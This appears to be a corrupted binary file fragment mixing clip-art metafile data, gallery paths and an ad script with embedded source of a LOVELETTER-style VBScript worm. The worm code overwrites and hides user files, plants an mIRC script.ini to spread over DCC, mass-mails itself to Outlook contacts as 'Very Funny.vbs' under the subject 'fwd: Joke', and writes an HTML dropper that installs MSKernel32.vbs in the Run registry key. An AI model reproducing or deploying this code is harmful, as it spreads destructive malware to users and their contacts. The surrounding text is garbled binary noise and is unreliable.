On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\W����         ����       W  �  �K   	  �%   �
���
���	�������������������������������������������������������������s���a���M���8���8���&�����������������������������������������~���s���i���^���T���J���?���3���&�������|�	�����������������{���u���o���p���t�m�t�P�j�5�e�&�_��Y�	�T���P���M���L���N���W���_���d���f�}�f�}�d�r�`�h�Z�`�R�Y�M�W�H�T�B�R�=�P�7�N�2�L�,�I�'�G�,�=�3�3�:�)�A��G��K��M���L���I���F���B���?���:���6���0���+���%�������������������������������������������������������������������������������������v���k���`���T���G���=���3���)��� �����������������������.�	�/��0���1���1���2���3���4���6���7���9���<���>���?���?���>���<���<���=���?���@��A��D�~�H�w�M�p�S�j�Y�e�`�b�h�`�p�_�}�b���g���l���l���r���z���������x��o��j�-�l�A�n�A�p�H�q�Q�p�Y�n�`�i�f�e�l�`�r�]�y�Y��V���S���P���M���L���M���N���O���P���O���O���M���F���>���7���.��%���,��?�
������������ ���!���"���"���#���%���(���*���,���.���*���'���%���#���������������� ����� �
���	�����������������������������������������������������������������������������������{���w���t���l���e���]���V���N���G���@���9���4���0���+���'���"���������������������������������%���+���0���5���8���:���;���<���;���5���-��%�x��o��a��c�
�d��f���g���h���h���i���j���k���l���l���n���s���{��������������������������������������������������������������������������������������������������������"���,���4���<��?�
�C��F��J��M�!�R�&�W�+�]�(�\�#�[��Y��X��R� �L���E���=���4���)���������������������������������������������"���%���)���/���5���<���C���J���R���Z���c���f���j���o���s���������������������������������������������������������������������� ����������� ��-��9��E��F��G��G�
�]�
�Y���X���X���X���W���Q���I��>��3� �&�+��5��?���G���E��:��0��&�%��-��4��8���9���:���:���:���;���5���0���-���*���'���$��� �����������	��� ���&���,���1���/���&� ����	��
�R��L���F���?���^���a���e���i� �l��q��v�	�z�
���������������
�/��)��#����� �"���&���*���B���Z��p�������~��|���y���v���r���n���i���o���w����������������� ���������'���5���B���6���*��������������������������������������������������������������������&���.� �6��>��G��O��W��^��^��O��A��3��&������ �����������������!��)��1��9�)�@�6�F�D�L�S�P�c�S�l�V�c�V�Z�V�R�V�I�V�@�V�7�U�/�U�'�T�'�U�#�V��V��U��T��S��R�
���
����/��B��E��J��N��R�"�b�%�v�*���5���5���5���4���4���-���'���!�������{��t�
������������ ���&���-���5���>���F���N���V���^���d���k���p���t���x���}�
���������)���3���>���B���G���M���S���Z���b���j���s���w���}�������������������������������������������������������������������������������
������*���9���I���X���h���y���|���~���������{���v���p���j���d���`���]���\���X���S�x�M�m�G�b�@�W�:�L�5�A�1�5�4�5�;�?�B�H�J�Q�S�Z�[�c�c�l�j�v�q����������������������������������������&���7���H���Y���j���{�������������������������������������������������������������������������������=���=���E���M���U���]���e���l���s���z���s���l���e���^���V���O���G���@���@���6���-���$���������
������������������������������������)���2���<���D���M���V���_���i���   -    �    -    -    �   33      -     (   $ ��{���t���y���}�������������������������������������������������������{�   -    �    -    -    �   33      -     .   $ m�u�k�o�g�l�b�i�^�g�V�g�O�h�H�k�A�l�@�n�?�p�>�q�?�s�D�u�J�w�P�y�U�{�\�{�c�{�i�z�m�u�   -    �    -    -    �   33      -     ^   $- O�C�K�B�G�A�B�@�>�@�9�?�5�>�0�>�,�=��:��6��1���,���&��� ���������
����������������������������������������{��������������������������� ���(���/���5���:��>��A�*�C�<�D�O�C�   -    �    -    -    �   33      -     &   $ ��>���?���?���?���?���?���?���?���@���B���C���D���D���C���B���@���>�   -    �    -    -    �   33      -     �   $A ��$���!����������������t��g��c��_��Z�
����.��3��9� �>�!�D�"�I�#�O�$�U�%�[�%�`�&�e�'�j�(�o�(�u�(�z�)���)���)���)���)���)���(���(���'���%���$�   -    �    -    -    �   33      -     F   $! �����������
�b��i��q��z��������������������   -    �    -    -    �   33      -     h   $2 (��������������������������������������������������|�}�t�r�k�g�b�^�W�V�K�N�>�F�2�=�&�4��)���
�#��,�/�7�A�C�S�P�c�_�q�o�}�����������������������������������������������������	���������(���(���   -    �    -    -    �   33      -     *   $ $���$������������
���	���	���
������
�����������������z���t�y�n�q�i�h�c�`�\�Y�T�R�K�L�;�A�*�7��-��%��� ���������%���'���*���,���.���0���2���5���9���9���;���>���B���G���N�
�U��^�!�e�%�o�)�y�1���4���5���7���9���;���<���>���?���A���@���>���;�	�7��5�1�6�F�9�\�>�l�C�|�J���S���X���\���_���c���g���l���s���{�������   -    �    -    -    �   33      -     8   $ o���l�y�i�k�g�]�f�M�b�8�c�!�f�
�j���k���i���i���h���f���`���c���d���c���^��U�,�R�M�U�l�b���q���o���o���   -    �    -    -    �  ���      -     �   $? ��������������������������t���h���^���R���F���;���/������������������������������������l���U���?���*���������/���D���0���0�������������������������%���6���C���O���\���i��������������������������,���W�����������������������������������������   -    �    -    -    �  ���      -     X   $* 
��$� �B� �a����������������	���
������
�������� ��)��2��;��D��>��8��2��-�   -    �    -    -    �   33      -         $ =��>��@��A��B�
������������������
���
�n��{������������������������������������������|���m���`���R� �D��7��a��a�
�   -    �    -    -    �   33      -     "  $� ��s���b���O���=���,������ ��������}���u���k���_��Y�|�R�y�L�w�E�u�>�t�6�s�/�q�(�p�+�r�/�s�3�u�7�v�;�x�?�z�C�}�G��L���Q���U���Z���Y���V���R���O���-���0���5���9���=���F���M���R���U���U���N���H���A���:���B���H���L���Q���T���X���\���a���t��p��l��h��d��`��\��X��U�
�^��f�
�j��j��j�
�)��&���#���;���R���i������������������������������������������������
�x��j��\��M��>��/�   -    �    -    -    �  ���      -     .   $ @�6�;�3�6�1�0�1�*�1�#�2��3��4��5��8��;�"�>�'�A�,�D�1�G�5�K�9�O�@�L�A�F�@�>�@�6�   -    �    -    -    �  ���      -     �   $J ����������������������������������������������������������~���z���w���t���u���w���z���}����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   -    �    -    -    �  ���      -     d  $� ��������������������������v���k���a���^���[���Y���X���V���T���R���O���J���H���H���I���K���L���M���O���S���X���Z���Y���R���L���F���@���:���5���0���,��)�z�&�i�#�W� �W��W��V��V��^��f��n��v��}�����������������������������#���)���1���4���6���6��5��/��(���!��!�� ���
���������������������
���������������������������������������������������� ������
��
�������������������
�����������������������������������}���z���v���r���o���k���e���`���Z��S��M��F��@��:���4���.���)���)��+�	�,��,��.��1��4��6�!�7�'�8�*�9�.�9�2�;�5�?�;�H�;�Q�;�Y�;�b�;�k�;�s�<�{�>��@��I���S���_���l���y���������������������������������   -    �    -    -    �  ���      -     &   $ H���G���C���?���;���0���)���%��� ���&���,���1���7���;���@���D���H���   -    �    -    -    �  ���      -     J   $# ��k���n���q���s���r��_���[���Y���Y���Y���Z���\���]���_��`��a��b��d��g��j��m��p���r���s���t���t���r���o���k���h���e���c���d���f���k�   -    �    -    -    �  ���      -     @   $ `���a���`���]���Y���U���P���K���F���F���A���<���8���3���/���,���)���'���(���+���0���6���:���?���D���I���O���V���]���`���   -    �    -    -    �  ���      -     H   $" ������������������������������������������������������{���{�����������������������������������������������������   -    �    -                        
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send�  ���All Categories C:\Program\Microsoft Works\workscor\j0160042.wmf   � �G� \�      �   � �7�         $=w� � PO4���n ���g���  �            � x     �n č��  �       @�n & x  �            ����� x                ��n        All Categories0C:\Program\Microsoft Works\workscor\j0160042.wmf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  on
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "fwd: Joke"
male.Body = vbcrlf&""
male.Attachments.Add(dirsystem&"\Very Funny.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
                  nd if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\Very Funny.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\Very Funny.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub                                     �A�AA����lZ5����(����:��8���1�蛪���,������)|ф� *�� A����** =ʳ���Z ���I8����	"�2�"xp�+"!ډ9����؈�ډS��(h�$*�`+�R% �*+R����X�������R@'��3����h=��� ���8A�'ب"�� 
�X���K���;9� �i���<  ����;*?����,	 ��)x�}#����Ӏ������!Z0��* L�>9��������I��H��������8	0	�0)1�k
��	����)
��By��,�		@��੉�����������G��8�������x)�������)<��!�����H �����QkB��� �(:)��!)�RP��X1���Q����H "����(5�H��ɛ9A L�9��S5Z� ��,���	%Q��[����)���q������������
=��
��*�"i�02/�?�� i��>,!��rP	���,	���Ʉ2�L�����* �/3����@�� ��� .+t��E$������:B��� �ΤI*���-���
Q$��L+ 	��R1���"B#�?����JX  ��,(@� ���� ���)��82���#�+�☑��1<����! �*���˚�$��-�+�������!��
b�  K���q������1��S�� 1:�x2�! �"	��,P`
�� I)(��)'y@	�ȃ��+@�҂" 	]{�� �����@9):���y��I���2���z1����(I���
1s��j �+؁�X8�3��'.���������	������;����qx�º	bFɐ�,+����*[����)��	53 ��k��@j*�ႉ	��������*�����#� ���Z���"H��8�
+>����q#2�����i�)3
�yt����(:�
�ð��x¨���b5��(�p��)	
�Ø�����(���,���/9BQ��-������Иb��I+�������Ԛ�q1�����`��ĳ�B	��ʜxh:: K>����� ��XI*��1<���ؐ�����qqZ;� �����! ��I��,��Z)������"��R�J!� ������	0yi�����	B		̭�)��Մ������j{���?: � � ��*<2ñ黹:JA�递)3C����<)�Ę���3 ;P��ࡈ��ɚ$��$B�᱁٫kI����$���0
������`
�C
���HR������Y8*)�����00�����4��(.������ <��á1���(�؁*��,������� (K=����B�j9������I�,Ģ��1�
R�J�% #+�(;9 ��!�𰒇
y������� ���+!�x(���8�����mI�"!����XH����*$����8X���
�
�#?� ��p� ��a ��(Ņ	 J����ZI�� ;0�����(*�����
�@Dظ.����I�
�C����$� 
q��(* �1�Z����� �����
�)4�����!`0��� 	 ��h��������� C:��0��6!	�y(�ʹQ��I� ������`�9������)���ʭ 0i����/��a��(��2@��� Q�� rS����ih,���
�/H��8(4��:")�B�����A���H*����,H����X�)�� ��# 
 	ri���)@��� �
��9 �ڪ�:��8e ��Z� :��������3�����	Q8;����
Y�����(?-! 2,�&�QC��[)1h��=�k�����: 2�p��RH����ə�
*�	�����6��
�x�5 ���� ��[J	�0
����1(��� ��
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            ����;���������AO���"	�)�� ���2/��А��,I	���x��*�0h��*������7*ȕ��@"1�H��
Љ��(0�� ��9����(>
���: E�2 �Hr ��)�����[��˙��px����	�)�������"*������/�1�9�����B�������09츢�@٢��(9k80��؀�1!����HH��(&��� ��"���0+�!!h����rى+����	��:B���QB@����,hx����%�(9�����Is����F�+��+�҄�� 1ۡ���9k�
�Ģ���)
�	�aB��(����	xz������QH�����2�`Ѐ!��	)���,����SA�)�S �qP����)2 =	������Y��	�(-�B �P���0iI����� �-k����Ȑ�)����� bt" )��1=I�)����ɛx!�Ѽ��#Y@�Ҋ1(����(����2H j:�� ��X�������@-����	 1�@P�ڐ
��	R*I
��	J! �	���S(y;)��(2&++����!9������)����D*�IAP9��)H�ę)	"�� ��������		��	�� ��0���!-�X��	��$	������*���*)�����ri�����
��X!��`����pa� � ����Br� @����]�������2���*Hhi%�!$>� 	�Bp� (��)1�98����Y��9��78Y������"B^ ������I!��- 3��9)2� ���3����?.�+	)����)+�����
) �,	��!8��A��;"���0�������AE�	<�sh��������R0����BX B�ß�xy�����
��ó  ���!233����
�
�������2!���
�)	�*8Y��	+���×3�!���#��Sc	�� �%��X�����13�� �'4 	���˟����˺��� 2
���2$S�	�=,��D
����ue ��   .����� �Q��ɣ��++����с	�а��	�!��
�����wd�+��x��	Q��;h����q4���J�����*���� -ᑀ��cq�����ڊ���hx�����������)� �(�� 	 | (q"������D��Z���'���3x�!(��� (��K+
4��7@a��
�*$)Iz�j��$�)l �
�!��[�����j�IA+�����"�
���" "�����
�������0�����#t����. ��������̱�����X���㲒
���h ����	i)˚�#�Y �	��5R	�P(���� ���!�	�s#����,�QH �		��I2I ��ǂ�����F-�"���б���b0�­����	����	��)>�� �*���������ɔ	�ZY!��/�(C��+B�hI���#�|H)��5#h���������@�!"�L��
���	�R+��"IQ� j��C �P0�� "2��?�ٱ��A��8��8�!�!���9������Xb ����A�� �
����90.(��"Y
A�� @��/����H��H�����������9��A�R�;9�����͉���*� 8 	�2`�����`Q����� 0�Ȅs@ �@�!" ���-� !,8��
(�����Y� H���) ���I*������2��� �*���Ԓ����ఙA8���������� )(�1f��!�������&��AUR#����q"������Y +J���J�4�I` 1��
Ⱒ�@c����	@1`C �	1  3�9ʏ��)��(*�0(xp�����"*������!(ȟڰ�2�������h��������(b����,�����Є�`!)��?M�����
��$�����A'�0,1/��( ������5'3���'�P0�W۪���p!�1�뉊���'$  � �
���	ȋ	��qr�����Ɋ(%Jɺ�ʁ�#�)aʉ�!�#B6�C����A
`����A"�����ut��A�)������! �誚re)1���!�A1�����
���$UB��
@�	>1�������ʊ(ɜ���&����
��B729H�������3 d 
��s9c�G9��������2������ ��Iؘ�!� ��������A# %!"I�27�YY)�����!3(ڳ�=��� 3H#�X����Dh)������9!���0���J"8��늂Ƀ��;�����(@���������� ��9�Ѿ �'�25������$2%0)	۩��� �K�4�X�  !pڹ��`3��8��QQ9$��-A�B�Р�!hr���2����(/!ʅ����1R@*�!  �+�
<��ꂙ��������Љ�����)��
��:���̪ɂ�!EA S�a�2B�����	��B#(2��B��ɨ�.Q ���R�������� JFIF  H H  �� Ducky     5  �� C 		

$_��(ܟ�"����i�����         ����       )
������������n�G�6�6�4�$������ 
� � 1� C� X� _� [� Sdw'�7�C�O�Y~dqr8w
�
�   �  ��      -    � @   $ ;� F� L� Q� X_g#t $������ �� �� �� �� �� �{ �� �{ |� l� [� I� =� ;� ;�    �  ���      -    � 6   $ �b�y������+�6�8�9�=�I�X�d�v�w�vgq4H+1�?�L�b�b   �  ?��      -    � d   $0 � �~ �t �w �| �r }r qu jk _g Ko <p -| � #� &� (� &� aw��������������2&F2S7a=iDkQi`fsa�b�q���f���w�3�� �� �� �� �   �  �Ÿ      -    � R   $' �������������1�S�^�t��������������������������������z�_�>�!#
 L� P� V� c� f� c� [� P� L� L�    �  �Ÿ      -    �    $ �)�.�/�&������)�)   $ ��� �� �� �� �� � 
� � ��   �  ̌�      -    � ,   $  )6CMTYX Q�F�;�,���	   �  ���      -    �    $ �8�C�F�8���   �           -    �    $ @ h O e ] � _ � W � @ h @ h >   $  �  � ) � 0 � : � @ � E � H � L � T � ] � b � b � ` U P � G � < � 5 � * � $ � * � * � % �  �  �  �  �  �    $	 e 	r 	{ � { $o $g e 	e 	   $ _ � h � m � j � _ � _ � _ �    $
� � � � � 	� � � � $   $ � � (3
?K
"*)22879;7>3B+GN
U�\�e�k�o�r�t�t|tppckTbCX3L B:2� +� $� � � 
�
����������������(   $ i�r���������������������������t�i�i�"   $ 	����#�)�/�/�(����	�	�	�&   $ 9EBMGTN]TeYn^udcval]cVZQSOMGE9E9E(   $ W>^FeMmTt\zck�s�y�n�bxVqPiHcB^<W>W>R   $' ��(�2�<�D�N�X�a�k�w������'�-�1�6�&����� ������t�g�X�L�?�5�,�%����N   $% `,p4?�F�K�O�T�Z�`�d�d�g�k�p�z���������������x�q�m�n�j�f�a�[�U�R�Jn@_6`,`,*   $ SD^LeUl_rhupyw|���z�t~mshia`[WUQJGSDSDR   $' +>(N$[!gsy#~'+~/~3{2�3�6�9�>�B�H�N�R�X�Z�T�L�F�A�B|At?p;l5o/r+q.j1\4P9D+>+>�   $l XPXXVcSlPsL{L�N�R�U�Z�^�c�f�j�k�k�e�Y�P�B�9�)�����������t�g�T�F�;�5�+���� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� ���'�2�>�Q�f�z���������������� �'�6�J�^�r������������������������������z�v�o�j�e�a�_�^�^{aocdeXdP_LXPXP^   $- P�T�X�[�^�c�i�o�t�y�|�����������������������������������������������}�x�q�l�g�d�^�V�R�P�P�2   $ =Z7Y2\-`*e*j.o5s:u@uCpCkDg?c:c9h5k3e6b9_=_=Z=Z   $
6�2�-�'��0�0<   $ ��������������������������������������������������������N   $% �1�#����������������"�3�B�M�W�_�h�c�V�?�*�������������������
�������(�-�1�1�1�3�7�9�:�>�F�Q�Z�b�h�n�g�_�S�F|>u6r2v0}-�+�+�)�'���� y�n�f�^�\�Z�c�c0   $ � ������������
����!�#�#�"� � D   $  q^vb{b^�X�R�N�G�C�6w-n%aXL>0&� "0>JU!i/w>{F{KwRq^q^R   $' �� �� �� �� �� �� �� �� �� �� �� �� �� �����
���� �� �� �� �� �� �� �� �� �� �� 6   $ ��� �� �� �� �� �� �� ��  � � 	� 	� � � � �� �� �� �� �� ���0   $ MSZ+b8gFjSlhm}n�n�i�n�s�t�uxvfvNu@t3_MM.   $ (� 3� ;� C� I� N� P� M� G� =� 5� +� !� � � � &   $ X� [ ^cgjkkfc� b� `� \� U� W� X� X� Z   $+ �� �� �� �� �� �� �� �� �� �� �� �� �� ����~uokm r v��������� �� �� �� �� �� �� �� �� �� �� ��    $ Q� T� W� \� a� c� c� ^� \� U� Q� Q� <   $ �� x� n� c� W� M� G� @� =� C� I� N� R� T� W� X� X� T� P� L� S� ^� k� v� � �� �� ��                        ~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~   ��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������� �������������������������������������������������������������������������������������������������������������������������������������������  ���All Categories c:\Program\Vanliga filer\Microsoft Shared\Clipart\cagcat50\PE02484_.wmf  �         -x� � ��2���n ���g���  �            � x     �n č��  �       @�n & x  �            ����� x                ��n        All CategoriesGc:\Program\Vanliga filer\Microsoft Shared\Clipart\cagcat50\PE02484_.wmf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ����������������������������������������   C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~      ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������ ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������<script language="JavaScript">
<!--
clicktag_1 = String('/event.ng/Type=click&FlightID=3135&AdID=665330&TargetID=3135&Segments=3144,5078&Targets=3135,5069&Values=31,43,48,50,60,77,80,91,101,110,150,207,300,598&RawValues=&Redirect=http://ads.dayrates.com/cgi-bin/clicktracker/i/b/22486_5961/http://se.kelkoo.com/category.jsp?catId=125701%26kpartnerid=8901090');
flash_url = String("http://ads.dayrates.com/ads/11242/telefon_se_140x350.swf");
start = clicktag_1.indexOf('http');
clicktag = clicktag_1.substrin                         )
������������n�G�6�6�4�$������ 
� � 1� C� X� _� [� Sdw'�7�C�O�Y~dqr8w
�
�   �  ��      -    � @   $ ;� F� L� Q� X_g#t $������ �� �� �� �� �� �{ �� �{ |� l� [� I� =� ;� ;�    �  ���      -    � 6   $ �b�y������+�6�8�9�=�I�X�d�v�w�vgq4H+1�?�L�b�b   �  ?��      -    � d   $0 � �~ �t �w �| �r }r qu jk _g Ko <p -| � #� &� (� &� aw��������������2&F2S7a=iDkQi`fsa�b�q���f���w�3�� �� �� �� �   �  �Ÿ      -    � R   $' �������������1�S�^�t��������������������������������z�_�>�!#
 L� P� V� c� f� c� [� P� L� L�    �  �Ÿ      -    �    $ �)�.�/�&������)�)   $ ��� �� �� �� �� � 
� � ��   �  ̌�      -    � ,   $  )6CMTYX Q�F�;�,���	   �  ���      -    �    $ �8�C�F�8���   �           -    �    $ @ h O e ] � _ � W � @ h @ h >   $  �  � ) � 0 � : � @ � E � H � L � T � ] � b � b � ` U P � G � < � 5 � * � $ � * � * � % �  �  �  �  �  �    $	 e 	r 	{ � { $o $g e 	e 	   $ _ � h � m � j � _ � _ � _ �    $
� � � � � 	� � � � $   $ � � (3
?K
